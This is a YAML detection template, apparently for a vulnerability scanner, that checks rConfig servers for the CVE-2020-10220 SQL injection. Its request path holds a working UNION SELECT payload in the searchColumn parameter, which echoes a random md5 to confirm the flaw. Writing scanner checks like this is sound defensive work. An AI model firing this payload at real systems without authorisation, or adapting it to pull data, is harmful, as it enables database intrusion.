name: poc-yaml-rconfig-commands-inc-cve-2020-10220-sqli
manual: true
transport: http
set:
    rand: randomInt(200000000, 210000000)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /commands.inc.php?searchOption=contains&searchField=1&search=search&searchColumn=1%3d2+UNION+SELECT+(select+concat(0x223E3C42523E5B,md5({{rand}}),0x5D3C42523E)+limit+0,1),NULL--+
        expression: |
            response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
expression: r1()
detail:
    author: corp0ra1
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10220
    vulnerability:
        id: CT-119297
        level: critical
